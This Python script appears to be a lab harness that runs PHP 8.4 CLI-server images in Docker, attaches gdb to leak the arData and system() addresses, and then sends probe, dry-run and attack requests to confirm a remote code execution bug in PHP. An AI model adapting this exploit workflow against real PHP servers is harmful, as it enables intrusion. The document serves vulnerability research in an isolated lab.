#!/usr/bin/env python3
"""Bounded script-stage checks for php -S / ZTS images.

The FPM runner owns its nginx/FPM lifecycle, so this small companion keeps the
same probe -> dry -> attack payload shape while attaching gdb to the single
PHP CLI-server process.  Every image gets one isolated container and a JSON
record plus the complete gdb transcript.
"""
import argparse
import datetime as dt
import http.client
import json
import os
import pathlib
import signal
import socket
import subprocess
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
import fpm_eol_matrix as M  # noqa: E402


def now():
    return dt.datetime.now(dt.timezone.utc).isoformat()


def docker(*args, timeout=60):
    return subprocess.run(["docker", *map(str, args)], capture_output=True,
                          text=True, timeout=timeout)


def request(port, path, timeout=180):
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
        c.request("GET", path)
        r = c.getresponse()
        body = r.read(512)
        c.close()
        return r.status, body
    except Exception as exc:  # noqa: BLE001
        return -1, ("%s: %s" % (type(exc).__name__, exc)).encode()


def wait_port(port, timeout=60):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=2):
                return True
        except OSError:
            time.sleep(.25)
    return False


def stop(name):
    docker("rm", "-f", name, timeout=30)


def server_pid(name):
    r = docker("exec", name, "sh", "-c", "pgrep -o php || true", timeout=10)
    vals = [x for x in r.stdout.split() if x.isdigit()]
    if vals:
        return int(vals[0])
    # The official CLI images run the server as PID 1 and may not ship
    # procps before the debugger bootstrap.
    cmdline = docker("exec", name, "cat", "/proc/1/cmdline", timeout=10)
    return 1 if cmdline.returncode == 0 and b"php" in cmdline.stdout.encode() else None


def gdb_args(name, pid):
    return ["docker", "exec", "-e", "FPM_GDB_SKIP_HUGEKEYS=2", name,
            "stdbuf", "-oL", "-eL", "gdb", "-p", str(pid), "--batch",
            "-ex", "set pagination off", "-ex", "set confirm off",
            "-ex", "set follow-fork-mode child", "-ex", "set detach-on-fork on",
            "-ex", "handle SIGPIPE nostop noprint pass",
            "-ex", "handle SIGSEGV stop print pass",
            "-ex", "handle SIGBUS stop print pass",
            "-ex", "handle SIGABRT stop print pass", "-ex", "catch fork",
            "-ex", "catch vfork", "-ex", "catch exec",
            "-ex", "catch syscall clone", "-ex", "catch syscall execve",
            "-ex", "print (void*)&system",
            "-ex", "source /opt/ht_dump_fpm2.py"] + [x for _ in range(300)
            for x in ("-ex", "continue")]


def run_one(image, name, port, out_path, trigger_mode=1, fake_gc_refcount=1):
    log_path = out_path + ".gdb.log"
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    pathlib.Path(log_path).write_text("GDB_NOT_STARTED\n")
    row = {
        "run_id": pathlib.Path(out_path).stem, "image": image,
        "sapi": "cli-server", "platform": "native", "kind": "rce",
        "endpoint": M.FORGE_ENDPOINT, "n": M.N_BYTES, "p0": hex(M.P0_DEFAULT),
        "cmd": M.CMD, "proof_path": M.PROOF_PATH,
        "trigger_mode": trigger_mode, "fake_gc_refcount": fake_gc_refcount,
        "started_at_utc": now(), "evidence": {"json": out_path,
                                                 "gdb_log": out_path + ".gdb.log"},
        "processes": {},
    }
    gp = None
    fh = None
    try:
        stop(name)
        r = docker("run", "-d", "--name", name, "--cap-add=SYS_PTRACE",
                    "-m", "1g", "--pids-limit", "256", "-p",
                    "127.0.0.1:%d:80" % port, "-v", ROOT + "/webroot:/var/www/html",
                    "-v", ROOT + "/config/php-lab.ini:/usr/local/etc/php/conf.d/zz-lab.ini:ro",
                    image, "php", "-S", "0.0.0.0:80", "-t", "/var/www/html",
                    timeout=60)
        if r.returncode or not r.stdout.strip():
            raise RuntimeError("CLI-server container failed: " + r.stderr.strip())
        row["container_id"] = r.stdout.strip()
        if not wait_port(port):
            raise RuntimeError("CLI-server port did not become ready")
        ver = docker("exec", name, "php", "-v", timeout=15)
        lint = docker("exec", name, "php", "-l",
                      "/var/www/html/urlenc/forge-variant.php", timeout=15)
        row["runtime"] = {"version": ver.stdout.splitlines()[:2],
                           "version_exit_code": ver.returncode,
                           "lint_exit_code": lint.returncode,
                           "lint_output": (lint.stdout + lint.stderr).strip()}
        if ver.returncode or lint.returncode:
            raise RuntimeError("PHP runtime/lint failed")
        pid = server_pid(name)
        if not pid:
            raise RuntimeError("could not find php -S process")
        cp = docker("cp", os.path.join(ROOT, "docker", "gdb_install.sh"),
                    name + ":/tmp/gdb_install.sh", timeout=30)
        if cp.returncode:
            raise RuntimeError("gdb installer copy failed: " + cp.stderr.strip())
        ins = docker("exec", name, "sh", "/tmp/gdb_install.sh", timeout=1200)
        row["gdb_install"] = {"exit_code": ins.returncode,
                               "stdout_tail": ins.stdout[-300:],
                               "stderr_tail": ins.stderr[-300:]}
        if ins.returncode or "gdb" not in ins.stdout:
            raise RuntimeError("gdb install failed")
        cp = docker("cp", os.path.join(ROOT, "docker", "ht_dump_fpm2.py"),
                    name + ":/opt/ht_dump_fpm2.py", timeout=30)
        if cp.returncode:
            raise RuntimeError("gdb probe copy failed")
        pid = server_pid(name)
        fh = open(log_path, "w", buffering=1)
        gp = subprocess.Popen(gdb_args(name, pid), stdout=fh,
                              stderr=subprocess.STDOUT, start_new_session=True)
        row["processes"]["gdb"] = {"pid": gp.pid, "started_at_utc": now(),
                                    "runtime_limit_seconds": 900}
        time.sleep(4)
        if gp.poll() is not None:
            raise RuntimeError("gdb exited during attach")
        status, body = request(port, M.forge_url(probe=True))
        time.sleep(.3)
        log = pathlib.Path(log_path).read_text(errors="replace")
        hits = M.parse_huge(log)
        ard = hits[-1][1] if hits else None
        sysaddr = M.parse_system(log)
        row["probe"] = {"http_status": status, "ardata": hex(ard) if ard else None,
                        "system": hex(sysaddr) if sysaddr else None}
        if ard is None or sysaddr is None:
            raise RuntimeError("probe did not produce arData/system")
        dry_url = M.forge_url(ard, sysaddr, trigger=trigger_mode, dry=True,
                              fake_gc_refcount=fake_gc_refcount)
        dry_status, dry_body = request(port, dry_url)
        time.sleep(.3)
        log = pathlib.Path(log_path).read_text(errors="replace")
        dry_hits = M.parse_huge(log)
        dry_ard = dry_hits[-1][1] if len(dry_hits) > len(hits) else None
        row["dry_run"] = {"http_status": dry_status,
                           "ardata": hex(dry_ard) if dry_ard else None,
                           "proof_absent": docker("exec", name, "test", "!", "-e",
                                                   M.PROOF_PATH).returncode == 0}
        if dry_status != 200 or dry_ard is None or gp.poll() is not None:
            raise RuntimeError("CLI-server dry request did not preserve worker")
        docker("exec", name, "rm", "-f", M.PROOF_PATH)
        attack_status, attack_body = request(
            port, M.forge_url(dry_ard, sysaddr, trigger=trigger_mode, dry=False,
                              fake_gc_refcount=fake_gc_refcount))
        time.sleep(1)
        log = pathlib.Path(log_path).read_text(errors="replace")
        attack_hits = M.parse_huge(log)
        attack_ard = attack_hits[-1][1] if len(attack_hits) > len(dry_hits) else None
        proof = docker("exec", name, "cat", M.PROOF_PATH, timeout=10)
        row["attack"] = {"http_status": attack_status,
                          "actual_ardata": hex(attack_ard) if attack_ard else None,
                          "address_match": attack_ard == dry_ard if attack_ard else False}
        row["proof"] = proof.stdout.strip() if proof.returncode == 0 else ""
        row["hit"] = M.PROOF_TOKEN in row["proof"]
        row["gdb_closure"] = {
            "zend_array_destroy_seen": "in zend_array_destroy" in log,
            "fake_array_destroy_seen": "fake_array_ht=" in log,
            "system_call_seen": "SYSTEM_CALL" in log,
            "execve_function_seen": "FUNCTION_HIT symbol=execve" in log,
            "vfork_seen": "vfork" in log,
        }
        row["classification"] = "rce_confirmed" if row["hit"] else "rce_not_demonstrated"
        if not row["hit"]:
            row["failure_root_evidence"] = [
                "CLI-server remained available through probe/dry/attack=%s/%s/%s" %
                (status, dry_status, attack_status),
                "proof token %r absent; gdb closure=%s" %
                (M.PROOF_TOKEN, json.dumps(row["gdb_closure"], sort_keys=True)),
            ]
        return row
    except Exception as exc:  # noqa: BLE001
        row["classification"] = "inconclusive"
        row["error"] = "%s: %s" % (type(exc).__name__, exc)
        row["failure_root_evidence"] = [row["error"]]
        return row
    finally:
        if gp is not None and gp.poll() is None:
            try:
                os.killpg(gp.pid, signal.SIGTERM)
                gp.wait(timeout=5)
            except Exception:  # noqa: BLE001
                try:
                    os.killpg(gp.pid, signal.SIGKILL)
                except Exception:
                    pass
        if fh is not None:
            fh.close()
        stop(name)
        row["finished_at_utc"] = now()
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        pathlib.Path(out_path).write_text(json.dumps(row, indent=2))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--images", default="php:8.4.26-cli,php:8.4.26-zts")
    ap.add_argument("--out-dir", default=os.path.join(
        ROOT, "out", "sapi-matrix"))
    ap.add_argument("--port-base", type=int, default=29500)
    ap.add_argument("--trigger-mode", type=int, choices=(1, 2, 3), default=1)
    ap.add_argument("--fake-gc-refcount", type=int, choices=(0, 1, 2), default=1)
    args = ap.parse_args()
    results = []
    for i, image in enumerate(x.strip() for x in args.images.split(",") if x.strip()):
        stamp = dt.datetime.now(dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        key = image.replace(":", "-").replace("/", "-")
        out = os.path.join(args.out_dir, "sapi-%s-%s.json" % (key, stamp))
        print("== %s port %d" % (image, args.port_base + i), flush=True)
        results.append(run_one(image, "sapi-%s-%d" % (key, i),
                               args.port_base + i, out,
                               args.trigger_mode, args.fake_gc_refcount))
        print("   class=%s hit=%s proof=%s" %
              (results[-1].get("classification"), results[-1].get("hit"),
               results[-1].get("proof", "")), flush=True)
    summary = os.path.join(args.out_dir, "sapi-matrix.json")
    pathlib.Path(summary).write_text(json.dumps(results, indent=2))
    print("saved: %s" % summary, flush=True)


if __name__ == "__main__":
    main()
